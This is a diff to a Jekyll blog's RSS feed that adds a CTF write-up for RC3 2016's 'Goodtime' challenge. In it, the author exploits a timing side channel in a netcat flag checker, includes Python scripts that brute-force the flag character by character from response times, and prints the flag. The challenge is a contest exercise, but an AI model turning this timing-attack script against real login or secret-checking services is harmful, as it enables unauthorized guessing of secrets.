@@ -5,30 +5,220 @@
     <description>This is the jekyllTheme example blog. It only exists to demonstrate how the theme looks and feels.</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-      <pubDate>Mon, 22 Aug 2016 18:37:09 -0700</pubDate>
-    <lastBuildDate>Mon, 22 Aug 2016 18:37:09 -0700</lastBuildDate>
+      <pubDate>Sun, 20 Nov 2016 21:09:40 -0800</pubDate>
+    <lastBuildDate>Sun, 20 Nov 2016 21:09:40 -0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
-        <title>test</title>
-        <description>&lt;h2 id=&quot;im-at-the-library&quot;&gt;Im at the library&lt;/h2&gt;
+        <title>RC3 2016 ~ Goodtime: Misc 150</title>
+        <description>&lt;p&gt;This is a challenge from RC3 2016. RC3 generally hosts a CTF every year and have been one of my favorite CTFs simply because it’s a lot easier than the DefCon qualifying CTFs. This challenge in particular was extremely long for a measly 150 points. It’s not very hard - just really annoying and inconsistent.&lt;/p&gt;
+
+&lt;h2 id=&quot;challenge-details&quot;&gt;&lt;strong&gt;Challenge Details&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;Goodtime - 150
+--------------
+The flag is not on the youtube video, the flag on there is someone trying to confuse you. Sorry.
+The flag is also longer than normal.
+https://www.youtube.com/watch?v=H7HmzwI67ec
+nc goodtime.ctf.rc3.club 5866
+NOTE: there should be a prompt when you connect. if there isn&#39;t it went down so scream at me in IRC until I fix.
+
+author: wumb0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Like any person would - the first I did was viewed the youtube video:&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/H7HmzwI67ec&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;Obviously no clues here - it’s just a video of Carly Rae Jepson. I did however get a good laugh when some guy posted a fake flag in the comments. Next thing to do was check out the netcat connection.&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;script height=&quot;800&quot; type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/93602.js&quot; id=&quot;asciicast-93602&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+   &lt;figcaption&gt; nc goodtime.ctf.rc3.club 5866&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;After trying out the netcat server, when we input a flag that has the correct format it takes longer to respond. Since the title of this challenge is called goodtime - I’m going to assume the exploit is a timing attack. I would assume the server checks the input one character at a time. Thus an input of “Apple” have a shorter response time than “RC” simply because the server would check the “A” in “Apple” and stop - while the server would check “R”, then “C” then look for a “3” (RC3) in “RC”. Let’s validate this by creating a script and testing it out.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/rc3/goodtime/manualTime.py&quot;&gt;manualTime.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python
+import time
+import socket
+import re
+import sys
+
+timer = time.clock if sys.platform == &#39;win32&#39; else time.time
+
+#host to connect to
+host=&quot;54.167.134.245&quot;
+#the port with whatever u want 
+port = 5866
+#creating a socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#default values
+flag = &quot;&quot;
+highestTime = 0
+attempt= &quot;RC3-2016-&quot;
+allowedChars = &quot;klmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#start timer
+start = timer()
+#start connecction
+s.connect((host, port))
+#Recover 2014 bytes of response and print
+data2 = s.recv(1024)
+print data2
+print &quot;Attempting: &quot; + attempt
+#Send out flag
+s.send(attempt + &#39;\n&#39;)
+#Read response
+data2 = s.recv(1024)
+#end timer
+print timer()-start
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This script pretty much creates a socket and connects to the netcat server via the host and port provided. I then connect to the server using that socket and read any incoming bytes. We then send our attempt for the flag. We then wait for a response and print out the time. This kind of socket scripting is useful when the server response is consistant. Here’s what it looks like in usage.&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;script height=&quot;800&quot; type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/93604.js&quot; id=&quot;asciicast-93604&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+   &lt;figcaption&gt;manualTime.py&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Since now we know it’s a timing attack and the flag format is “RC3-2016-XXXXX”, we only need to guess the last line of the flag. The way to go about doing is to test every single character - like a brute-force attack.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-a&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-b&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-c&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-d&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-e&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-f&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Assuming we hit the right character - that response would be be quite larger than the other inputs. Thus we can just save the character with the longest response time and assume that’s the next character in the flag. I automated this process in&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/rc3/goodtime/goodtime.py&quot;&gt;goodtime.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python
+import time
+import socket
+import re
+import sys
+
+timer = time.clock if sys.platform == &#39;win32&#39; else time.time
+
+host=&quot;54.167.134.245&quot;
+#the port with whatever u want 
+port = 5866
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#default values
+flag = &quot;&quot;;
+highestTime = 0;
+attempt= &quot;&quot;
+allowedChars = &quot;abcdegfhijklmnopqrstuvwxyz-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;amp;*()&quot;
+
+for x in range(0,50):
+	# Resets highestChar
+	highestChar=&quot;&quot;
+	for x in allowedChars:
+		#Creates attempt 1
+		attempt = flag + x
+		#Create socket
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		#Start timer
+		start = timer()
+		#Connect to netcat
+		s.connect((host, port))
+		#Recover response
+		data2 = s.recv(1024)
+		print data2
+		#Send flag
+		print &quot;Attempting: &quot; + attempt
+		s.send(attempt + &#39;\n&#39;)
+		#keep this to get the actual response
+		data2 = s.recv(1024)
+		#End timer
+		time1 = timer()-start
+		print &quot;Time 1: &quot; + str(time1)
+		# print &#39;time taken &#39;, timer()-start ,&#39; seconds&#39;
+		if (timer()-start &amp;gt; highestTime):
+			highestTime = timer()-start
+			highestChar = x
+		s.close()
+		#attempt 2
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		start = timer()
+		s.connect((host, port))
+		data2 = s.recv(1024)
+		s.send(attempt + &#39;\n&#39;)
+		#keep this to get the actual response
+		data2 = s.recv(1024)
+		time2 = timer()-start
+		print &quot;Time 2: &quot; + str(time2)
+		# print &#39;time taken &#39;, timer()-start ,&#39; seconds&#39;
+		average = (time1+time2)/2
+		print &quot;Average: &quot; + str(average)
+		if (average &amp;gt; highestTime):
+			highestTime = average
+			highestChar = x
+		s.close()
+	print &quot;Adding [&quot; + highestChar + &quot;] to flag&quot;
+	flag = flag + highestChar;
+	print &quot;Current Flag: &quot; + flag
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let’s check it out in use:&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;script height=&quot;800&quot; type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/93590.js&quot; id=&quot;asciicast-93590&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+   &lt;figcaption&gt;manualTime.py&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Combining both the automation and the manual check we were able to get the flag.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s confirm&lt;/p&gt;
+
+&lt;figure&gt;
+&lt;script height=&quot;800&quot; type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/93610.js&quot; id=&quot;asciicast-93610&quot; async=&quot;&quot;&gt;&lt;/script&gt;
+   &lt;figcaption&gt;manualTime.py&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;The hardest part of this was a lot of the time the connection was inconsistent. Any new characters I recieved from my script I had to triple check manually. When I saw the words &lt;strong&gt;itz-al&lt;/strong&gt;, I already knew it was a carly rae reference. I manually input every version of &lt;strong&gt;always&lt;/strong&gt; like &lt;strong&gt;alw4ys&lt;/strong&gt; and &lt;strong&gt;alw@ys&lt;/strong&gt; - one character at a time. Whenever the response time went up - I knew that was the correct character. The most trickiest part was after &lt;strong&gt;g00d-t1m&lt;/strong&gt;. I thought I was done because I assumed the flag was &lt;strong&gt;itz always a good time.&lt;/strong&gt; I had to bruteforce the second &lt;strong&gt;1&lt;/strong&gt; for t1m1ng. I had no clue why it was a 1. Not only that but the &lt;strong&gt;@tt@ck&lt;/strong&gt; at the end threw me off because I initially assumed the flag would be alphanumeric. The last word took me atleast 3 hours because the server kept crashing and each flag I input had a response time of atleast 10 seconds. To brute force the &lt;strong&gt;@&lt;/strong&gt; it required all lowercase, uppercase, numbers, and punctuations - 10 seconds a piece. About 10 minutes if I was lucky the server didn’t crash. At last though I was able to get the flag.&lt;/p&gt;
 </description>
-        <pubDate>Mon, 22 Aug 2016 04:29:33 -0700</pubDate>
-        <link>/blog/ctf/stego/crypto/all/test</link>
-        <guid isPermaLink="true">/blog/ctf/stego/crypto/all/test</guid>
+        <pubDate>Sun, 20 Nov 2016 03:29:33 -0800</pubDate>
+        <link>/blog/ctf/misc/all/goodtime</link>
+        <guid isPermaLink="true">/blog/ctf/misc/all/goodtime</guid>
         
-        <category>Stego</category>
+        <category>RC3</category>
         
-        <category>QueerCon</category>
-        
-        <category>Crypto</category>
+        <category>Programming</category>
         
         
         <category>CTF</category>
         
-        <category>Stego</category>
-        
-        <category>Crypto</category>
+        <category>Misc</category>
         
         <category>All</category>
         
